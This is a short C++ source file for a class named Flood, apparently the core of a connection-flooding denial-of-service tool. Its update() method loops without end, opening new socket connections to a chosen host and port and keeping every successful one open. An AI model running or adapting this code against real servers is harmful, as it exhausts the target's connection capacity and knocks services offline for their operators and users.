#include "Flood.h"

#include "./reseaux/Socket.h"

void addConnexion();

Flood::Flood(std::string host, unsigned short int port): m_host(host), m_port(port), m_start(false)
{
}

Flood::~Flood(void)
{
}

void Flood::update()
{
	if (m_start)
		return;

	m_start = true;

	while(m_start)
	{
		Socket* s = new Socket();

		if ( s->connexion(m_host, m_port) )
			addConnexion();
		else
			delete s;
	}
}
